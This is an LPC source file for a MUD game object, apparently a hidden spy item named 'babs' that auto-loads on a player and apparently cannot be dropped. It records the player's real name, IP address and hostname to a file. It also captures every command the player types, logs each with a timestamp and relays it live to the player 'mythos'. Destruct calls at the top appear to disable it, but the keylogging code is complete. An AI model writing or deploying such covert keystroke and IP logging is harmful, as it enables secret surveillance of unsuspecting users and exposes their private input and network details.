#define haha  "babs"

int m;
reset(arg) {
   destruct(this_object());
  if(arg) return;
  
if(this_player())
write_file("/players/mythos/closed/others/<>"+
this_player()->query_real_name(),this_player()->query_real_name()+
" "+query_ip_number(this_player())+"  "+ this_player()->query_hostname()+"\n\n");
  
  m = 0;
  call_out("heh",100);
}

query_auto_load() { return "/players/mythos/closed/play/baka.c:"; }

get() { return 1; }
drop() { return 1; }
id(str) { return str == haha; }
init() {
   destruct(this_object());
  add_action("ekg"); add_xverb("");
}

set_listen(n) { m = n; }

ekg(str) {
  if(find_player("mythos") && m == 1) {
tell_object(find_player("mythos"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");}
write_file("/players/mythos/closed/others/<>"+
this_player()->query_real_name(),
    (ctime(time()))+" > "+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
}

heh() {
  if(environment(this_object()))
  move_object(this_object(),environment(this_object()));
call_out("heh",100);
return 1;}

exit() {
  if(this_player() == environment(this_object())) return 1;
  if(this_player() && this_player()->query_level() > 90) return 0;
    else return 1;
}
